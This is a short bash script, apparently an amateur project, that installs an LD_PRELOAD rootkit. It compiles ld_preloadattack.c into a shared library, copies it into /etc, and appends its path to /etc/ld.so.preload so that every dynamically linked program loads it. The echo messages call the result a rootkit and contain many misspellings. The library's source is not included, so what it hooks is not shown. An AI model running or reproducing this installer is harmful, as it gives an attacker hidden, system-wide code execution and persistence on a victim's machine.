#/bin/bash
echo "compileing the sheared libery"
gcc -shared -fpic ld_preloadattack.c -o ld_preloadattack.so -ldl

echo "inserting the libary to /etc/ld.so.preload"
#export LD_PRELOAD=.$PWD/ld_preloadattack.so
cp ld_preloadattack.so -t /etc

echo "secessfully inserting the libary"
echo /etc/ld_preloadattack.so >> /etc/ld.so.preload
echo "rootkit run secesfully"
